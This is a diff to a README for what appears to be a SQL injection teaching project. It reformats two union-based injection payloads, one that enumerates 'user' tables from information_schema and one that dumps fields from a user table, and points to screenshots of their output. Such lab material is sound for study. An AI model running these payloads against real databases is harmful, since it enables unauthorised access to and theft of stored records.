@@ -43,8 +43,8 @@ Steps to Implement this program:- ( For Windows users)
    Output:-
      <img src = "screenshots/Screenshot from 2019-10-03 00-30-45.png" height = 500 width  = 900/>
 
-   2. ```a' and 1=0 union select table_schema, table_type, table_catalog from information_schema.tables 
-      where table_name like 'user%';#```
+   2. ```a' and 1=0 union select table_schema, table_type, table_catalog from information_schema.tables where table_name like 'user%';#```
+      
       
         <img src = "screenshots/Screenshot from 2019-10-03 00-31-57.png" height = 500 width  = 900/>
         
@@ -52,8 +52,8 @@ Steps to Implement this program:- ( For Windows users)
           <img src = "screenshots/Screenshot from 2019-10-03 00-32-01.png" height = 500 width  = 900/>
      
 
-   3. ```a' and 1=0 union select concat_WS(':', name), concat_WS(':', srno, city), name, city from user;#```
-   
+   3. ``` a' and 1=0 union select concat_WS(':', name), concat_WS(':', srno, city), name, city from user;#  ```
+    
      <img src = "screenshots/Screenshot from 2019-10-03 00-34-12.png" height = 500 width  = 900/>
      
      Output:-
